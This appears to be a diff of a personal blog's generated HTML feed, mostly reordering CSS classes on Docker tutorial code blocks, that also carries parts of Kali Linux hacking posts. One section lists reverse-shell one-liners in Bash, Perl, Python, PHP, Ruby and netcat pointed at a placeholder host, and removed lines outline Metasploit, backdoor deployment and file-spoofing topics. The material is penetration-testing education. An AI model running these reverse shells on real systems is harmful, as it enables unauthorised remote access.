-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run -it -p &lt;span class="m"&gt;8000&lt;/span&gt;:3000 -v /app/node_modules -v &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;pwd&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;:/app &lt;span class="o"&gt;[&lt;/span&gt;image_id&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run -it -p &lt;span class="m"&gt;8000&lt;/span&gt;:3000 -v /app/node_modules -v &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;pwd&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;:/app &lt;span class="o"&gt;[&lt;/span&gt;image_id&lt;span class="o"&gt;]&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p&gt;If using Windows, replace the &lt;code&gt;${pwd}&lt;/code&gt; with the full path to the folder, ensuring to swap all backslashes to forwards slashes and changing &lt;code&gt;C:&lt;/code&gt; to &lt;code&gt;/C/&lt;/code&gt;. Here is an example:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run -it -p &lt;span class="m"&gt;8000&lt;/span&gt;:3000 -v /app/node_modules -v /C/Users/jackm/Documents/GitHub/docker-kubernetes-course/frontend:/app &lt;span class="o"&gt;[&lt;/span&gt;image_id&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run -it -p &lt;span class="m"&gt;8000&lt;/span&gt;:3000 -v /app/node_modules -v /C/Users/jackm/Documents/GitHub/docker-kubernetes-course/frontend:/app &lt;span class="o"&gt;[&lt;/span&gt;image_id&lt;span class="o"&gt;]&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;h3 id="docker-compose"&gt;Docker Compose&lt;/h3&gt;
 &lt;p&gt;Rather than using the rather large command above, let's use Docker Compose.&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
  2
  3
  4
@@ -1066,7 +1166,7 @@ This workflow is 100% achievable without Docker, although Docker will make thing
 &lt;li&gt;We mount the current directory to the app directory in the container for updating in sync&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;Again, if using Windows, we need to add some more options to our service:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
 2
 3
 4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;stdin_open&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;true&lt;/span&gt;
@@ -1083,7 +1183,7 @@ This workflow is 100% achievable without Docker, although Docker will make thing
 &lt;/ol&gt;
 &lt;p&gt;Option 1 can be cumbersome as we will need to do this each time when running a container.&lt;/p&gt;
 &lt;p&gt;Option 2 is achieved by creating a new service in our &lt;code&gt;docker-compose.yml&lt;/code&gt; file:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
  2
  3
  4
@@ -1130,7 +1230,7 @@ This workflow is 100% achievable without Docker, although Docker will make thing
 &lt;/ol&gt;
 &lt;h3 id="multi-stage-dockerfile"&gt;Multi-stage Dockerfile&lt;/h3&gt;
 &lt;p&gt;To implement our multi-stage Dockerfile as above we do this we the following yaml:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
  2
  3
  4
@@ -1162,6 +1262,7 @@ This workflow is 100% achievable without Docker, although Docker will make thing
 &lt;ul&gt;
 &lt;li&gt;&lt;a href="https://jackmckew.dev/develop-and-deploy-with-docker.html"&gt;Develop and Develop with Docker&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://jackmckew.dev/develop-and-deploy-multi-container-applications.html"&gt;Develop and Develop Multi Container Applications&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://jackmckew.dev/intro-to-kubernetes.html"&gt;Intro to Kubernetes&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h2 id="docker-ecosystem"&gt;Docker Ecosystem&lt;/h2&gt;
 &lt;p&gt;&lt;img alt="Docker Logo" class="img-fluid" src="https://jackmckew.dev/img/Moby-logo.png"/&gt;&lt;/p&gt;
@@ -1237,7 +1338,7 @@ This workflow is 100% achievable without Docker, although Docker will make thing
 &lt;/table&gt;
 &lt;h2 id="dockerfile"&gt;Dockerfile&lt;/h2&gt;
 &lt;p&gt;A Dockerfile is a read-only template with instructions for creating a Docker container/image. It's composed with a series of commands, along with their given arguments. A straightforward example of a Dockerfile is:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
 2
 3
 4
@@ -1286,7 +1387,7 @@ This workflow is 100% achievable without Docker, although Docker will make thing
 &lt;h2 id="port-mapping"&gt;Port Mapping&lt;/h2&gt;
 &lt;p&gt;By default no traffic will be routed into a container, meaning a container has it's own set of ports that are not connected to the local PC. Thus we need to set up a mapping between the local PC and the containers ports.&lt;/p&gt;
 &lt;p&gt;This is not changed within the Dockerfile, but rather when we run the container with the &lt;code&gt;-p&lt;/code&gt; flag. This can be done with:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run -p &lt;span class="o"&gt;[&lt;/span&gt;local_pc_port&lt;span class="o"&gt;]&lt;/span&gt; : &lt;span class="o"&gt;[&lt;/span&gt;container_port&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;image_name&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run -p &lt;span class="o"&gt;[&lt;/span&gt;local_pc_port&lt;span class="o"&gt;]&lt;/span&gt; : &lt;span class="o"&gt;[&lt;/span&gt;container_port&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;image_name&lt;span class="o"&gt;]&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;blockquote&gt;
@@ -1302,7 +1403,7 @@ This local PC port and the container port do NOT have to match.&lt;/p&gt;
 &lt;li&gt;Create an container that will host a nodejs app&lt;/li&gt;
 &lt;li&gt;Network the ports of the nodejs app container&lt;/li&gt;
 &lt;/ol&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
 2
 3
 4
@@ -1471,27 +1572,27 @@ This local PC port and the container port do NOT have to match.&lt;/p&gt;
 &lt;/ol&gt;
 &lt;p&gt;Following this are a list of commands that you could execute to get a reverse connection for different supported languages. Where the variable to change denoted by &lt;code&gt;[HOST_IP]&lt;/code&gt; and optionally to change the port. Note that these are all 'one-liners' so they could be executed in input boxes.&lt;/p&gt;
 &lt;h4 id="bash"&gt;Bash&lt;/h4&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bash -i &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt; /dev/tcp/&lt;span class="o"&gt;[&lt;/span&gt;HOST_IP&lt;span class="o"&gt;]&lt;/span&gt;/8080 &lt;span class="m"&gt;0&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bash -i &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt; /dev/tcp/&lt;span class="o"&gt;[&lt;/span&gt;HOST_IP&lt;span class="o"&gt;]&lt;/span&gt;/8080 &lt;span class="m"&gt;0&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;h4 id="perl"&gt;PERL&lt;/h4&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;perl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="s"&gt;'use Socket;$i="[HOST_IP]";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&amp;gt;&amp;amp;S");open(STDOUT,"&amp;gt;&amp;amp;S");open(STDERR,"&amp;gt;&amp;amp;S");exec("/bin/sh -i");};'&lt;/span&gt;
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;perl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="s"&gt;'use Socket;$i="[HOST_IP]";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&amp;gt;&amp;amp;S");open(STDOUT,"&amp;gt;&amp;amp;S");open(STDERR,"&amp;gt;&amp;amp;S");exec("/bin/sh -i");};'&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;h4 id="python"&gt;Python&lt;/h4&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST_IP]",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'&lt;/span&gt;
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST_IP]",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;h4 id="php"&gt;PHP&lt;/h4&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="x"&gt;php -r '$sock=fsockopen("[HOST_IP]",8080);exec("/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3");'&lt;/span&gt;
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="x"&gt;php -r '$sock=fsockopen("[HOST_IP]",8080);exec("/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3");'&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;h4 id="ruby"&gt;Ruby&lt;/h4&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;ruby&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rsocket&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="s1"&gt;'f=TCPSocket.open("[HOST_IP]",8080).to_i;exec sprintf("/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d",f,f,f)'&lt;/span&gt;
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;ruby&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rsocket&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="s1"&gt;'f=TCPSocket.open("[HOST_IP]",8080).to_i;exec sprintf("/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d",f,f,f)'&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;h4 id="netcat"&gt;Netcat&lt;/h4&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -e /bin/sh &lt;span class="o"&gt;[&lt;/span&gt;HOST_IP&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;8080&lt;/span&gt;
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -e /bin/sh &lt;span class="o"&gt;[&lt;/span&gt;HOST_IP&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;8080&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;h3 id="local-file-inclusion"&gt;Local File Inclusion&lt;/h3&gt;
@@ -1501,7 +1602,7 @@ This local PC port and the container port do NOT have to match.&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;create a php file with the following:&lt;/li&gt;
 &lt;/ol&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
 2
 3
 4
@@ -1648,236 +1749,4 @@ This local PC port and the container port do NOT have to match.&lt;/p&gt;
 &lt;li&gt;Add the url in automated scan.&lt;/li&gt;
 &lt;li&gt;Bottom left under alerts, is where all the vulnerabilities that have been discovered are displayed.&lt;/li&gt;
 &lt;li&gt;If you right click one of the alerts (bottom left) then open in browsers it will show you the exploit and how it got it.&lt;/li&gt;
-&lt;/ol&gt;</content><category term="Software"></category><category term="software"></category><category term="infosec"></category></entry><entry><title>Gaining Access with Kali Linux</title><link href="https://jackmckew.dev/gaining-access-with-kali-linux.html" rel="alternate"></link><published>2020-09-04T00:00:00+10:00</published><updated>2020-09-04T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-09-04:/gaining-access-with-kali-linux.html</id><summary type="html">&lt;/head&gt;&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https …&lt;/a&gt;&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;/head&gt;&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https://www.kali.org/downloads/&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;This post is apart of a series of posts, see the other posts at:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://jackmckew.dev/network-hacking-with-kali-linux.html"&gt;Network Hacking with Kali Linux&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://jackmckew.dev/web-penetration-testing-with-kali-linux.html"&gt;Web Penetration Testing with Kali Linux&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Thank you to Chris B for helping me with the notes in this post below!&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2 id="table-of-contents"&gt;Table of Contents &lt;!-- omit in toc --&gt;&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="#gaining-access"&gt;Gaining Access&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#server-side-attacks"&gt;Server Side Attacks&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#metasploit"&gt;Metasploit&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#exploiting-backdoors"&gt;Exploiting Backdoors&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#an-example-backdoor-attack"&gt;An Example Backdoor Attack&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#payloads"&gt;Payloads&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#nexpose"&gt;Nexpose&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#client-side-attacks"&gt;Client Side Attacks&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#creating-backdoors"&gt;Creating Backdoors&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#connecting-from-the-backdoor"&gt;Connecting from the Backdoor&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#deploying-backdoors-via-fake-updates"&gt;Deploying Backdoors via Fake Updates&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#deploying-backdoors-via-exe-downloads"&gt;Deploying Backdoors via Exe Downloads&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#protection"&gt;Protection&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#social-engineering"&gt;Social Engineering&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#maltego"&gt;Maltego&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#backdooring-any-file-type"&gt;Backdooring Any File Type&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#spoofing-file-type"&gt;Spoofing File Type&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#spoofing-fake-emails"&gt;Spoofing Fake Emails&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#beef-browser-exploitation-framework"&gt;BeEF (Browser Exploitation Framework)&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#using-the-above---outside-the-local-network"&gt;Using the Above - Outside the Local Network&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#post-exploitation"&gt;Post Exploitation&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#maintaining-access"&gt;Maintaining Access&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#pivoting"&gt;Pivoting&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id="gaining-access"&gt;Gaining Access&lt;/h2&gt;
-&lt;p&gt;Any electronic device is a computer all concepts will work wether it is a phone, tv, router, websites, webservers etc
-Two types of attacks:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Server side - Doesn't require user interaction all we need is an IP&lt;/li&gt;
-&lt;li&gt;Client side - Requires user interaction such as opening a file or clicking a link&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id="server-side-attacks"&gt;Server Side Attacks&lt;/h3&gt;
-&lt;p&gt;Make sure the machine is pingable (open terminal and run &lt;code&gt;ping [IP]&lt;/code&gt;). Learning as much as possible about the target is essential for conducting a successful attack, if you can learn things such as:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Operating systems&lt;/li&gt;
-&lt;li&gt;Installed programs&lt;/li&gt;
-&lt;li&gt;Ports being used&lt;/li&gt;
-&lt;li&gt;etc&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;We can then use this information for identifying potential exploits (search engines are perfect for this). Things to look out for are:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Run Zenmap (Nmap) on the IP. Click the ports and services tab up the top to learn about the ports being used / misconfigured.&lt;/li&gt;
-&lt;li&gt;Google the version of operating system / programs for potential exploits&lt;/li&gt;
-&lt;li&gt;If you find an open FTP (file transfer protocol) port, try to connect through it&lt;/li&gt;
-&lt;li&gt;Try default usernames and passwords to log in (sometimes they won't have a password)&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id="metasploit"&gt;Metasploit&lt;/h4&gt;
-&lt;p&gt;Metasploit is a penetration testing framework that makes hacking simple. It's an essential tool for many attackers and defenders. Point Metasploit at your target, pick an exploit, what payload to drop, and hit Enter. Before testing metasploit on a live system, it's preferential to test on a virtualised system, enter metasploitable. Metasploitable is an intentionally vulnerable target machine for evaluating Metasploit which is virtualised and can be downloaded from: &lt;a href="https://information.rapid7.com/download-metasploitable-2017.html"&gt;https://information.rapid7.com/download-metasploitable-2017.html&lt;/a&gt;.&lt;/p&gt;
-&lt;h4 id="exploiting-backdoors"&gt;Exploiting Backdoors&lt;/h4&gt;
-&lt;p&gt;First from the information you've gathered about the target, we can then search for what exploits are available, and to use metasploit is as easy as:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;msfconsole&lt;/code&gt; (runs the metasploit console)&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;help&lt;/code&gt; (help on any command)&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;show [something]&lt;/code&gt; (something can be exploits, payloads, auxilaries or options)&lt;/li&gt;
